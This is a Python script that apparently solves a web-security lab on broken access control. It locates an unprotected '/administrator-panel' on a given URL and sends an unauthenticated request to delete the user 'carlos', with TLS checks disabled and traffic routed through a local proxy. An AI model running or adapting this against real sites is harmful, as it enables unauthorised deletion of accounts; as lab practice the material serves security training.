import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def delete_user(url):
    admin_panel_url = url +'/administrator-panel'
    r = requests.get(admin_panel_url,verify=False,proxies=proxies)
    if r.status_code == 200 :
        print("[+] found the administrator panel ")
        print("[+] deleting carlos user ")
        delete_carlos_url = admin_panel_url + '/delete?username=carlos'
        r = requests.get(delete_carlos_url,verify=False,proxies=proxies)
        if r.status_code == 200:
            print("[+] carlos user deleted ")
        else:
            print("[-] could not delete user ")
    else:
        print("[-] Administrator panel not found.... ")
        print("[-] Exiting the script ")




def main():
    if len(sys.argv) != 2:
        print("[+] usage : %s <url> " % sys.argv[0])
        print("[+] Example : %s www.example.com ")
        sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] finding admin panel.... ")
    delete_user(url)


if __name__ == "__main__":
    main()